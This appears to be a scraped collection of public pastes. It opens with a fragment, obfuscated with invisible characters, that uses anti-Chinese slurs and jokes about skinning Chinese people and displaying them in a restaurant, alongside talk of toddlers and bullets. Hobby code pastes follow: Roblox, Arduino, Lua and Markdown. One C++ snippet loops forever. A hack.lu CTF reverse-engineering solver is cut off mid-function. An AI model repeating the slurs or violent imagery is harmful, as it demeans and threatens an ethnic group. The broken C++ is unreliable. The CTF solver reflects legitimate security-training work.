‎g‎o‎d‎-‎a‎w‎f‎u‎l‎ ‎C‎h‎i‎n‎k‎s‎.‎

(‎(‎ ‎P‎l‎e‎a‎s‎e‎,‎ ‎S‎o‎m‎e‎o‎n‎e‎ ‎-‎ ‎A‎n‎y‎o‎n‎e‎,‎ ‎S‎t‎o‎p‎ ‎S‎e‎t‎h‎ ‎M‎a‎c‎F‎a‎r‎l‎a‎n‎e‎ ‎F‎r‎o‎m‎ ‎S‎i‎n‎g‎i‎n‎g‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎W‎i‎n‎d‎o‎w‎ ‎i‎s‎ ‎a‎ ‎s‎o‎n‎g‎ ‎c‎y‎c‎l‎e‎ ‎c‎o‎m‎p‎o‎s‎e‎d‎ ‎b‎y‎ ‎A‎r‎t‎h‎u‎r‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎ ‎w‎i‎t‎h‎ ‎w‎o‎r‎d‎s‎ ‎b‎y‎ ‎A‎l‎f‎r‎e‎d‎,‎ ‎L‎o‎r‎d‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎.‎ ‎W‎r‎i‎t‎t‎e‎n‎ ‎i‎n‎ ‎1‎8‎6‎7‎ ‎a‎n‎d‎ ‎p‎u‎b‎l‎i‎s‎h‎e‎d‎ ‎i‎n‎ ‎1‎8‎7‎1‎,‎ ‎t‎h‎e‎ ‎c‎y‎c‎l‎e‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎o‎f‎ ‎t‎w‎e‎l‎v‎e‎ ‎p‎o‎e‎m‎s‎ ‎b‎y‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎,‎ ‎e‎l‎e‎v‎e‎n‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎w‎e‎r‎e‎ ‎s‎e‎t‎ ‎t‎o‎ ‎m‎u‎s‎i‎c‎ ‎b‎y‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎,‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎t‎h‎i‎s‎ ‎o‎n‎e‎ ‎i‎l‎l‎u‎s‎t‎r‎a‎t‎i‎o‎n‎,‎ ‎t‎i‎t‎l‎e‎d‎ ‎""‎A‎ ‎R‎e‎v‎e‎r‎i‎e‎""‎,‎ ‎d‎r‎a‎w‎n‎ ‎i‎n‎ ‎1‎8‎6‎8‎ ‎b‎y‎ ‎J‎o‎h‎n‎ ‎E‎v‎e‎r‎e‎t‎t‎ ‎M‎i‎l‎l‎a‎i‎s‎ ‎a‎n‎d‎ ‎d‎e‎p‎i‎c‎t‎i‎n‎g‎ ‎a‎ ‎f‎e‎m‎a‎l‎e‎ ‎f‎i‎g‎u‎r‎e‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎p‎e‎n‎s‎i‎v‎e‎l‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎a‎ ‎w‎i‎n‎d‎o‎w‎.‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎ ‎h‎a‎d‎ ‎a‎ ‎d‎r‎a‎f‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎e‎x‎t‎ ‎b‎y‎ ‎F‎e‎b‎r‎u‎a‎r‎y‎ ‎1‎8‎6‎7‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎w‎a‎s‎ ‎d‎i‎s‎s‎a‎t‎i‎s‎f‎i‎e‎d‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎w‎o‎r‎k‎ ‎a‎n‎d‎ ‎r‎e‎l‎u‎c‎t‎a‎n‎t‎ ‎t‎o‎ ‎p‎u‎b‎l‎i‎s‎h‎ ‎i‎t‎.‎ ‎I‎n‎ ‎A‎u‎g‎u‎s‎t‎ ‎1‎8‎6‎7‎,‎ ‎T‎e‎n‎n‎y‎s‎o‎n‎ ‎h‎a‎d‎ ‎r‎e‎v‎i‎s‎e‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎d‎s‎,‎ ‎b‎u‎t‎ ‎h‎e‎ ‎r‎e‎f‎u‎s‎e‎d‎ ‎t‎o‎ ‎a‎l‎l‎o‎w‎ ‎p‎u‎b‎l‎i‎c‎a‎t‎i‎o‎n‎ ‎u‎n‎t‎i‎l‎ ‎N‎o‎v‎e‎m‎b‎e‎r‎ ‎1‎8‎7‎0‎.‎ ‎B‎y‎ ‎t‎h‎i‎s‎ ‎t‎i‎m‎e‎,‎ ‎h‎o‎w‎e‎v‎e‎r‎,‎ ‎M‎i‎l‎l‎a‎i‎s‎ ‎h‎a‎d‎ ‎d‎i‎s‎p‎o‎s‎e‎d‎ ‎o‎f‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎d‎r‎a‎w‎i‎n‎g‎s‎ ‎h‎e‎ ‎h‎a‎d‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎u‎b‎l‎i‎c‎a‎t‎i‎o‎n‎ ‎e‎x‎c‎e‎p‎t‎ ‎f‎o‎r‎ ‎""‎A‎ ‎R‎e‎v‎e‎r‎i‎e‎""‎,‎ ‎a‎n‎d‎ ‎h‎e‎ ‎w‎a‎s‎ ‎t‎o‎o‎ ‎b‎u‎s‎y‎ ‎t‎o‎ ‎w‎o‎r‎k‎ ‎a‎n‎y‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎o‎n‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎.‎

D‎r‎a‎w‎i‎n‎g‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎J‎o‎h‎n‎ ‎E‎v‎e‎r‎e‎t‎t‎ ‎M‎i‎l‎l‎a‎i‎s‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎A‎d‎a‎m‎ ‎C‎u‎e‎r‎d‎e‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎s‎k‎i‎n‎ ‎s‎o‎m‎e‎ ‎c‎h‎i‎n‎k‎s‎ ‎a‎n‎d‎ ‎h‎a‎n‎g‎ ‎t‎h‎e‎m‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎m‎y‎ ‎w‎i‎n‎d‎o‎w‎s‎ ‎i‎n‎s‎i‎d‎e‎ ‎m‎y‎ ‎n‎e‎w‎ ‎r‎e‎s‎t‎a‎u‎r‎a‎n‎t‎.‎ ‎I‎t‎ ‎s‎e‎r‎v‎e‎s‎ ‎A‎s‎i‎a‎n‎ ‎f‎o‎o‎d‎!‎ ‎I‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎A‎s‎i‎a‎n‎ ‎B‎B‎Q‎,‎ ‎a‎n‎d‎ ‎f‎r‎i‎e‎d‎ ‎c‎h‎i‎n‎k‎!‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎O‎M‎O‎R‎R‎O‎W‎:‎ ‎J‎U‎L‎I‎O‎ ‎T‎H‎E‎ ‎S‎P‎I‎C‎ ‎V‎S‎ ‎A‎G‎E‎N‎T‎ ‎J‎O‎N‎E‎S‎!‎ ‎💩💩💩💩💩💩 🧔🏾‍♂️🔫👨🏻 ‎T‎H‎E‎ ‎F‎I‎N‎A‎L‎ ‎A‎N‎D‎ ‎U‎L‎T‎I‎M‎A‎T‎E‎ ‎B‎A‎T‎T‎L‎E‎ ‎O‎F‎ ‎L‎I‎F‎E‎ ‎A‎N‎D‎ ‎D‎E‎A‎T‎H‎!‎ ‎T‎H‎E‎R‎E‎ ‎W‎O‎N‎'‎T‎ ‎B‎E‎ ‎E‎N‎O‎U‎G‎H‎ ‎T‎O‎D‎D‎L‎E‎R‎S‎,‎ ‎P‎O‎O‎,‎ ‎O‎R‎ ‎B‎U‎L‎L‎E‎T‎S‎ ‎I‎N‎ ‎T‎H‎E‎ ‎U‎N‎I‎V‎E‎R‎S‎E‎ ‎T‎O‎ ‎C‎O‎N‎T‎A‎I‎N‎ ‎T‎H‎I‎S‎ ‎B‎A‎T‎T‎L‎E‎!‎"
Lzw9WGJ7,Hover Effect Localscript,OnFireRobloxScriptin,Lua,Sunday 19th of October 2025 06:51:16 PM CDT,"--//Services
local tweenService = game:GetService(""TweenService"")

--//Variables
local ui = script.Parent
local originalSize = ui.Size
local originalPosition = ui.Position
local hoverSizeIncrease = UDim2.new(0.01, 0, 0.01, 0)
local hoverSize = originalSize + hoverSizeIncrease
local hoverPosition = originalPosition - UDim2.new(hoverSizeIncrease.X.Scale / 2, 0, hoverSizeIncrease.Y.Scale / 2, 0)
local tweenTime = 0.2

--//Tweens
local hoverTween = tweenService:Create(ui, TweenInfo.new(tweenTime), {Size = hoverSize, Position = hoverPosition})
local leaveTween = tweenService:Create(ui, TweenInfo.new(tweenTime), {Size = originalSize, Position = originalPosition})

ui.MouseEnter:Connect(function()
    hoverTween:Play()
end)

ui.MouseLeave:Connect(function()
    leaveTween:Play()
end)"
pvXfpCyL,Pulse Rate rev_03,pleasedontcode,Arduino,Sunday 19th of October 2025 06:09:46 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Pulse Rate
	- Source Code NOT compiled for: XIAO ESP32S3
	- Source Code created on: 2025-10-19 23:08:43

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* count pulses in  1 second period , pulses range */
	/* from 10 per second to 100 per second , read out */
	/* put in pulses per second and display on serial */
	/* monitor */
/****** END SYSTEM REQUIREMENTS *****/


/* START CODE */

/****** DEFINITION OF LIBRARIES *****/

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

#define PULSE_PIN 34

volatile unsigned long pulseCount = 0;
const unsigned long WINDOW_MS = 1000; // 1 second window for PPS calculation
unsigned long windowStartMillis = 0;

// Pulse input interrupt service routine
void IRAM_ATTR pulseISR()
{
	// Increment pulse counter on each rising edge detected
	pulseCount++;
}

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(115200);
	while (!Serial) {
		// wait for serial port to connect. Needed for native USB (ESP32-S3)
		yield();
	}
	// Configure the pulse input pin. Adjust pull mode if your sensor requires a different configuration.
	pinMode(PULSE_PIN, INPUT_PULLUP);
	attachInterrupt(digitalPinToInterrupt(PULSE_PIN), pulseISR, RISING);
	windowStartMillis = millis();
	Serial.println(""Pulse counter initialized"");
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	unsigned long currentMillis = millis();
	if (currentMillis - windowStartMillis >= WINDOW_MS) {
		// Capture the count for the last 1 second window
		noInterrupts();
		unsigned long countThisWindow = pulseCount;
		pulseCount = 0;
		interrupts();

		// Display pulses per second on the serial monitor
		Serial.print(""Pulses per second: "");
		Serial.println(countThisWindow);

		windowStartMillis = currentMillis;
	}
	// Short delay to yield to other tasks and avoid busy-waiting
	delay(1);
}

/* END CODE */
"
uhYCWUJZ,EnanReactorAutoConfig,Umaler,Lua,Sunday 19th of October 2025 06:03:35 PM CDT,"local event = require(""event"")
local component = require(""component"")
local term = require(""term"")

local TARGET_INSTABILITY = 2
local STABILIZER_ENERGY  = 10000
local OUTPUT_RATE    = 60000

local SLEEP_TIME = 3.0

local CORE_TYPE = ""warpdriveEnanReactorCore""
local PROCESSED_EVENTS = {
  ""interrupted"",
  ""component_added"",
  ""component_removed""
}

local function pairsByKeys(t, f)
  -- Возвращает элементы массива в отсортированном порядке
  local a = {}
  for n in pairs(t) do table.insert(a, n) end
  table.sort(a, f)
  local i = 0
  local iter = function ()
    i = i + 1
    if a[i] == nil then return nil
      else return a[i], t[a[i]]
    end
  end
  return iter
end

local function configureRelease(core)
  local energy, capacity = core.energy()
  local pct = energy / capacity
  if pct > 0.9 then
    core.releaseRate(OUTPUT_RATE)
  else
    core.release(false)
  end
end

local function initialConfig(core)
  core.stabilizerEnergy(STABILIZER_ENERGY)
  core.instabilityTarget(100 - TARGET_INSTABILITY)
  configureRelease(core)
  core.enable(true)
end

local function drawState(cores)
  term.clear()
  print(""Состояние ядер:"")

  for addr, core in pairsByKeys(cores) do
    pcall(function()
      local instabil = {core.instability()}
      instabil = 100.0 - (instabil[1] + instabil[2] + instabil[3] + instabil[4]) / 4.0
      local rmode = core.releaseRate()
      if rmode == ""at_rate"" then rmode = ""rate"" else rmode = ""hold"" end
      local strToPrint = addr ..
              ""\tEnergy: "" .. tostring(core.energy()) ..
              ""\tStability: "" .. tostring(instabil) ..
              ""\tRelease mode: "" .. rmode
      print(strToPrint)
    end)
  end
end

local function main()
  local cores = {}
  local rawList = component.list(CORE_TYPE)
  for addr, _ in pairs(rawList) do
    cores[addr] = component.proxy(addr)
    initialConfig(cores[addr])
  end
  rawList = nil

  drawState(cores)

  while true do
    local e = {event.pullFiltered(SLEEP_TIME, function(...)
      local passedName = select(1, ...)
      for _, ename in ipairs(PROCESSED_EVENTS) do
        if ename == passedName then
          return true
        end
      end
      return false
    end)}
    if e[1] == ""interrupted"" then
      return
    elseif e[1] == ""component_added"" then
      local addr, ctype = e[2], e[3]
      if ctype == CORE_TYPE then
        cores[addr] = component.proxy(addr)
        initialConfig(cores[addr])
      end
    elseif e[1] == ""component_removed"" then
      local addr, ctype = e[2], e[3]
      if ctype == CORE_TYPE then
        cores[addr] = nil
      end
    end

    for _, core in pairs(cores) do
      pcall(configureRelease, core)
    end
    drawState(cores)
  end
end

local s, e = xpcall(main(), function(err) return err .. ""\n"" .. debug.traceback(); end)
if not s then error(e) end
"
S99KLYUh,Untitled,Nsinecode,C++,Sunday 19th of October 2025 05:56:52 PM CDT,"if (minimum_.Empty() && Size() != 0) {
    Stack<T> right_reversed = right_.GetReversedStack();
    right_.DeleteStack();

    minimum_ = left_.GetMinStackWithOther(right_reversed);
  }


Node* GetFirstNode() { return head_; }
Stack<T> GetMinStackWithOther(Stack<T> other);
Stack<T> GetReversedStack();

template <typename T>
Stack<T> Stack<T>::GetMinStackWithOther(Stack<T> other) {
  Stack<T> min_stack;

  Node* current_node = head_;
  bool current_stack = true;

  while (current_stack || current_node != nullptr) {
    if (min_stack.Empty() || current_node->value <= min_stack.GetHead().second) {
      min_stack.Push(current_node->value);
    }

    if (current_node->next_node == nullptr && current_stack) {
      current_node->next_node = other.GetFirstNode();
      current_stack = false;
    }

    current_node = current_node->next_node;
  }

  return min_stack;
}

template <typename T>
Stack<T> Stack<T>::GetReversedStack()
{
  Stack<T> reversed_stack;

  Node* current_node = head_;

  while (current_node != nullptr) {
    reversed_stack.Push(current_node->value);
  }

  return reversed_stack;
}"
Qr2Rfyqv,LM Studio + AnythingLLM: Process Local Documents with RAG Like a Pro!,AmourSpirit,Markdown,Sunday 19th of October 2025 05:28:58 PM CDT,"# LM Studio + AnythingLLM: Process Local Documents with RAG Like a Pro!

## Summary

This video tutorial demonstrates how to use LM Studio and Anything LLM to query local data using a Retrieval-Augmented Generation (RAG) system. The presenter uses Basecamp API documentation as an example dataset.

The process begins by setting up LM Studio: selecting and running a local Llama model, then starting a server from the developer tab. Next, the user configures Anything LLM to connect with LM Studio as the LLM provider, using default embedding settings and LanceDB for the vector database.

After creating a workspace named ""Basecamp RAG,"" the presenter imports Basecamp API documentation files into Anything LLM. The system processes these documents into the vector database without requiring coding. Once setup is complete, the presenter tests the system by asking for the curl command for ""get Todo,"" and the system correctly retrieves the exact command from the imported documentation.

The tutorial emphasizes that this approach allows users to query any local documents (books, pamphlets, or other files) using their own locally-run language model, providing a private, customizable alternative to cloud-based services.

## Details

- Duration: 7m 20s
- URL: [LM Studio + AnythingLLM: Process Local Documents with RAG Like a Pro!](https://www.youtube.com/watch?v=UG8uftJXcNs)

## Tags
- LMStudio
- AnythingLLM
- RAG
- LocalDocuments
- VectorDatabase
- LlamaModel
- PrivateAI
- DocumentProcessing
- YouTube
- Video
- LocalLLM,LocalAI
"
egEDy9yt,Arduino Motors rev_01,pleasedontcode,Arduino,Sunday 19th of October 2025 05:15:33 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Arduino Motors
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-10-19 22:13:50

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* i dosnt work help me */
/****** END SYSTEM REQUIREMENTS *****/


/* START CODE */

#include <L298NX2.h>

// Pin definitions for dual motor control (A and B) on UNO
const unsigned int EN_A = 3;
const unsigned int IN1_A = 5;
const unsigned int IN2_A = 6;
const unsigned int IN1_B = 7;
const unsigned int IN2_B = 8;
const unsigned int EN_B = 9;

// Initialize motor driver for two motors
L298NX2 motors(EN_A, IN1_A, IN2_A, EN_B, IN1_B, IN2_B);

void setup()
{
  Serial.begin(9600);
  // Wait for serial monitor to be opened (not strictly needed on UNO, but keeps behavior similar to other boards)
  while (!Serial)
  {
    // do nothing
  }

  // Set an initial speed for both motors
  motors.setSpeed(150);
  Serial.println(F(""L298NX2 Motor Controller Ready. Commands: F Forward, B Backward, S Stop, L Left, R Right, U/D for Motor A, 2/3 for Motor B, + / - global speed""));
}

void loop()
{
  if (Serial.available() > 0)
  {
    char cmd = Serial.read();
    switch (cmd)
    {
      case 'F':
        motors.forward();
        Serial.println(F(""Forward""));
        break;
      case 'B':
        motors.backward();
        Serial.println(F(""Backward""));
        break;
      case 'S':
        motors.stop();
        Serial.println(F(""Stop""));
        break;
      case 'L':
        // Turn left: left motor forward, right motor backward
        motors.forwardA();
        motors.backwardB();
        Serial.println(F(""Turn Left""));
        break;
      case 'R':
        // Turn right: left motor backward, right motor forward
        motors.backwardA();
        motors.forwardB();
        Serial.println(F(""Turn Right""));
        break;
      case 'U':
        // Increase speed of Motor A
        {
          unsigned short sA = motors.getSpeedA();
          if (sA + 5 <= 255) motors.setSpeedA(sA + 5);
          else motors.setSpeedA(255);
          Serial.print(F(""SpeedA = ""));
          Serial.println(motors.getSpeedA());
        }
        break;
      case 'D':
        // Decrease speed of Motor A
        {
          unsigned short sA = motors.getSpeedA();
          if (sA >= 5) motors.setSpeedA(sA - 5);
          else motors.setSpeedA(0);
          Serial.print(F(""SpeedA = ""));
          Serial.println(motors.getSpeedA());
        }
        break;
      case '2':
        // Increase speed of Motor B
        {
          unsigned short sB = motors.getSpeedB();
          if (sB + 5 <= 255) motors.setSpeedB(sB + 5);
          else motors.setSpeedB(255);
          Serial.print(F(""SpeedB = ""));
          Serial.println(motors.getSpeedB());
        }
        break;
      case '3':
        // Decrease speed of Motor B
        {
          unsigned short sB = motors.getSpeedB();
          if (sB >= 5) motors.setSpeedB(sB - 5);
          else motors.setSpeedB(0);
          Serial.print(F(""SpeedB = ""));
          Serial.println(motors.getSpeedB());
        }
        break;
      case '+':
        // Increase global (both) speed
        {
          unsigned short s = motors.getSpeed();
          if (s + 5 <= 255) motors.setSpeed(s + 5);
          else motors.setSpeed(255);
          Serial.print(F(""Global speed = ""));
          Serial.println(motors.getSpeed());
        }
        break;
      case '-':
        // Decrease global (both) speed
        {
          unsigned short s = motors.getSpeed();
          if (s >= 5) motors.setSpeed(s - 5);
          else motors.setSpeed(0);
          Serial.print(F(""Global speed = ""));
          Serial.println(motors.getSpeed());
        }
        break;
      default:
        Serial.print(F(""Unrecognized command: ""));
        Serial.println(cmd);
        break;
    }
  }
}

/* END CODE */
"
iA7uF97T,hack.lu CTF 2025 - Rev: INSTRUCTIONS UNCLEAR,Xylitol,Python,Sunday 19th of October 2025 04:45:39 PM CDT,"# ================================================================
# Solveur pour le validateur ASM ""IKEA"" hack.lu CTF 2025 - Rev: INSTRUCTIONS UNCLEAR
# Solution by Hackgyver 2.0 & Claude.ai
# Ce que fait le code ASM:
# IN -> masquage -> substitution -> rolling-XOR -> permutation -> CAND
# Ensuite il vérifie si (CAND == c5d) alors PASS = 1 sinon PASS = 0
# Donc ce que nous devons faire:
# CAND -> dé-permutation -> annuler le rolling-XOR -> annuler la substitution -> dé-masquer -> IN
# ================================================================

# ASM: .ikea : constantes
FLEN  = 65  # Longueur du fichier / nombre total de bytes attendus en entrée
paX   = 23  # seed principale utilisée pour générer les clés
BLKSZ = 12  # Taille d'un bloc (les données sont traitées par paquets de 12 bytes)

# ASM: c5d, le flag encodé (la sortie que le programme attend)
c5d = [
225,204,82,249,67,214,139,164,154,116,172,47,62,84,45,3,47,104,35,84,93,44,
34,6,25,163,30,206,78,117,5,225,233,23,152,55,146,238,226,49,74,173,199,34,
15,78,84,81,161,96,220,110,128,201,46,27,123,41,191,6,123,58,89,119,69
]

# Petite table de correspondance (32 bytes) indiquant quel sous-tableau utiliser de la grosse table de substitution.
kallax = [3,0,0,2,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1,0,0]

# La grosse table de substitution (8192 bytes)
billy = [
166,241,180,132,190,47,251,88,10,46,127,195,92,216,151,226,
103,173,3,218,0,14,199,119,228,111,214,104,131,252,134,152,
225,52,39,60,56,179,4,144,24,203,233,156,167,91,146,254,
73,27,187,123,113,40,83,41,1,81,22,202,201,176,100,158,
87,50,128,182,84,209,55,240,20,62,51,184,75,220,175,192,
12,172,5,204,61,186,30,154,255,101,213,208,67,145,23,36,
170,141,108,212,181,193,82,37,74,211,109,155,168,221,138,207,
121,130,198,9,188,164,124,249,217,157,110,139,210,229,8,116,
93,6,178,29,70,2,129,53,183,197,99,95,38,244,65,125,
85,49,194,94,11,219,148,215,115,223,26,140,44,245,19,15,
248,86,7,205,253,171,160,169,246,105,191,54,243,239,238,79,
13,242,143,72,68,25,227,97,34,31,161,196,32,147,126,78,
71,57,159,137,114,42,230,250,117,106,59,17,133,98,16,177,
136,90,232,174,80,206,185,234,107,76,35,162,237,58,200,163,
89,77,222,142,102,21,189,122,48,224,165,69,64,247,149,66,
18,236,153,135,96,33,28,235,231,150,120,118,112,63,45,43,
177,88,7,134,38,179,127,126,41,20,25,233,37,141,82,124,
215,206,128,237,239,19,227,180,83,248,249,165,57,228,232,161,
94,6,192,142,64,200,77,42,132,4,221,153,65,48,238,135,
89,27,70,122,13,210,16,155,160,119,17,240,242,188,251,51,
107,22,208,162,197,230,39,229,146,157,168,76,67,105,49,213,
96,241,109,104,87,125,68,44,66,140,26,136,143,203,245,211,
183,10,193,43,100,172,171,28,85,98,226,151,73,236,91,40,
198,110,219,114,117,111,23,60,101,244,62,0,47,186,175,174,
191,167,52,148,189,173,61,194,250,231,130,54,50,187,93,185,
9,218,255,214,149,106,32,145,71,31,209,202,29,154,118,190,
201,56,12,204,84,5,115,246,58,14,166,103,235,170,147,247,
53,196,2,99,3,92,199,150,97,46,30,131,35,176,81,78,
222,133,59,18,178,253,79,182,123,75,217,163,137,113,223,95,
21,252,63,195,158,121,36,34,205,184,224,129,102,11,8,243,
225,159,254,33,181,112,90,74,216,138,120,80,24,1,220,156,
139,72,55,207,164,86,69,234,169,144,108,15,212,152,116,45,
58,14,250,180,0,171,247,215,46,166,50,118,73,231,33,7,
223,79,242,113,61,88,177,2,147,202,18,15,167,152,101,27,
183,220,158,30,224,128,153,198,187,6,178,22,34,232,210,5,
191,219,110,226,244,9,117,45,248,245,8,71,161,124,205,105,
69,92,241,132,246,81,51,142,20,37,172,208,160,75,62,53,
42,13,236,193,80,144,181,151,155,235,170,141,59,189,41,148,
87,233,197,109,123,253,206,19,86,126,188,254,195,182,133,100,
130,55,116,201,4,112,131,225,96,125,114,60,176,194,149,21,
211,156,200,134,216,240,111,28,243,140,68,255,237,3,102,10,
64,207,238,12,67,32,29,99,239,162,164,174,120,115,90,190,
230,184,89,228,78,221,36,107,52,157,95,17,108,74,234,145,
185,54,154,229,76,251,94,23,218,137,204,26,136,70,222,186,
165,91,39,179,173,163,85,66,24,168,150,72,47,199,139,119,
217,169,122,82,40,214,213,175,252,56,209,146,63,57,11,138,
127,104,31,1,159,97,83,249,196,106,48,43,227,143,98,16,
212,135,121,84,44,35,203,129,93,38,25,192,103,77,65,49,
255,148,204,174,252,10,233,164,253,76,113,9,187,33,51,20,
87,196,59,193,27,221,116,40,107,37,69,38,172,129,56,72,
194,119,142,203,168,224,120,133,156,247,195,166,143,70,241,126,
118,90,191,186,235,234,104,100,210,34,207,152,246,208,229,109,
64,57,190,160,44,140,132,139,28,62,79,92,182,167,19,202,
238,60,111,228,213,163,189,237,14,135,13,58,15,150,81,48,
42,226,93,211,236,21,157,217,250,231,24,185,68,7,198,225,
138,219,192,249,171,105,242,26,106,77,197,95,200,245,180,201,
179,43,88,244,136,147,6,121,39,153,223,36,146,232,144,89,
161,251,218,178,181,215,12,78,22,230,176,159,169,99,80,17,
206,35,114,66,212,173,85,53,52,222,127,31,125,103,82,243,
71,8,155,83,29,0,108,254,18,154,84,177,115,94,214,101,
46,188,102,73,1,170,97,5,151,134,98,45,4,131,91,65,
54,32,16,205,141,49,220,158,137,124,112,23,2,209,130,67,
199,122,227,41,11,184,96,47,183,149,239,110,25,175,145,123,
50,30,240,165,74,55,3,216,128,117,63,248,162,86,75,61,
144,192,167,72,80,203,160,78,18,82,208,212,222,235,228,84,
161,12,5,73,132,239,89,252,56,21,233,102,187,231,36,2,
74,246,39,85,1,130,110,0,97,226,240,156,254,151,47,31,
205,137,150,224,64,79,206,123,75,159,202,111,214,183,193,220,
67,140,55,3,182,93,136,200,135,127,117,145,17,8,204,34,
38,115,100,255,114,26,43,249,68,46,25,186,44,19,91,210,
42,32,185,81,7,52,165,90,71,178,147,27,195,98,124,134,
216,163,177,45,103,62,170,173,108,139,146,232,10,229,121,131,
16,191,94,237,190,181,245,171,230,57,172,247,122,107,154,168,
169,213,217,209,238,241,201,194,225,95,158,20,133,86,40,128,
125,179,50,157,242,142,243,129,174,218,223,116,54,37,175,118,
99,24,13,104,23,164,120,184,119,66,180,87,77,253,244,251,
101,88,83,215,29,248,152,59,198,166,92,69,48,4,143,138,
76,30,176,250,65,49,211,199,221,109,227,22,162,113,41,11,
219,148,96,58,197,149,61,15,196,141,70,35,9,188,153,105,
33,6,234,207,155,126,51,28,236,189,112,106,63,60,53,14,
133,211,196,173,138,240,254,105,34,251,116,151,242,225,122,106,
127,120,33,36,40,56,130,156,252,207,29,219,227,100,149,46,
186,176,70,51,200,101,230,136,109,67,243,21,234,134,93,50,
150,64,74,19,24,141,155,168,241,25,18,16,171,175,121,201,
245,255,187,115,82,3,226,107,43,154,124,42,145,52,32,182,
91,157,62,237,76,75,220,1,45,85,218,193,54,2,35,253,
90,163,58,113,28,203,167,98,4,162,152,189,87,217,146,123,
49,89,0,41,192,13,214,61,9,47,205,222,147,38,231,246,
199,174,39,129,232,114,135,92,83,55,14,185,238,224,102,161,
78,53,216,159,190,65,131,165,139,80,158,81,212,63,140,79,
30,26,143,233,248,71,249,22,247,77,180,166,179,197,236,223,
244,66,6,125,183,170,137,213,160,86,250,195,119,27,12,208,
210,37,177,169,97,48,228,215,112,110,84,59,5,209,221,10,
229,144,103,11,153,72,198,164,118,69,7,191,132,104,23,172,
148,96,17,202,194,184,88,20,188,126,73,235,204,108,60,31,
15,8,178,128,94,44,206,111,95,68,239,181,142,117,99,57
]

# ----- Génération de clé et keystream RC4 (mod N)
# ASM: init_SA/ksa_a + init_SB/cult + prga_*
# KSA modifié, initialise un tableau S de taille N.
def ksa_mod(N, key):
    S = list(range(N))
    j = 0
    for i in range(N):
        j = (j + S[i] + key[i % len(key)]) % N
        S[i], S[j] = S[j], S[i]
    return S

# ASM: PRGA modifié, génère out_len octets de clé.
def prga_mod(S, N, out_len):
    i = 0
    j = 0
    out = []
    for _ in range(out_len):
        i = (i + 1) % N
        j = (j + S[i]) % N
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % N
        out.append(S[t])
    return out


# ----- Fonctions auxiliaires pour les paramètres par bloc
def flags_for_block(bidx):
# ASM: stackfault: Calcule les drapeaux et options (use_billy, use_roll) pour un bloc donné.
    flags = (paX + 3*bidx + 0x5A) & 0xFF
    use_billy = flags % 2
    use_roll = 1 if (flags % 4) > 1 else 0  # cmp 1, t5; jl set_roll
    return flags, use_billy, use_roll

def billy_slice_index(bidx):
# ASM: steuerfahndung: Détermine quel sous-tableau de 'billy' utiliser pour ce bloc.
    billy_id = (paX + 3*bidx) % 32
    return kallax[billy_id]  # renvoie une valeur entre 0 et 5


# ----- Inversion complète d’un bloc de transformation (permute^-1 -> roll^-1 -> billy^-1 -> prga_mask^-1)
def invert_block(block_cand, bidx):
    lenb = len(block_cand)

    # 1: Annuler la permutation (Fisher–Yates inversée)
    # ASM: stage_perm -> init_SP/ksa_sp/prga_sp -> permute (BADRING)
    PK0 = (paX + 13*bidx + 57) & 0xFF
